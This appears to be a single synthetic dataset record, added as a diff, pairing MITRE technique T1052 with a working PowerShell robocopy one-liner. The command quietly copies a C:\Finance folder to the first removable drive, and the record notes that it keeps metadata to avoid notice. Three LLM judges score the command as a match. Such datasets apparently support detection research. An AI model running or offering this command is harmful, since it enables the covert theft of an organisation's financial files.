@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); robocopy \"C:\\Finance\" \"$dl:\\Receipts\" /E /Z /R:1 /W:1 /COPY:DAT /DCOPY:T /XJ /NFL /NDL /NP",
+  "explanation": "Uses robocopy to mirror financial data to a removable drive, preserving timestamps and attributes to blend in.",
+  "rationale_steps": [
+    "Resolve the first removable drive letter.",
+    "Use robocopy with resilient and quiet options to copy the directory tree to the USB.",
+    "Preserve file metadata to reduce anomalies."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-fa0fd7bc",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes/parentheses, a valid pipeline, proper command separator, and valid robocopy flags.",
+        "semantic_score": 4,
+        "semantic_justification": "It selects the first removable drive and recursively copies C:\\Finance to it while preserving timestamps and attributes, aligning with T1052 exfiltration, but it is not a true mirror (/MIR not used) and will fail if no removable drive letter is found.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:34:57.936713Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses, correct variable assignment, proper piping, and valid robocopy parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically detecting a removable drive and copying financial data to it with options that preserve attributes and timestamps while minimizing visibility through quiet operation flags.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:35:00.794444Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses and quotes, proper command separation, and valid robocopy flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of exfiltrating financial data to a removable drive while preserving metadata for stealth, directly aligning with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:35:14.312844Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
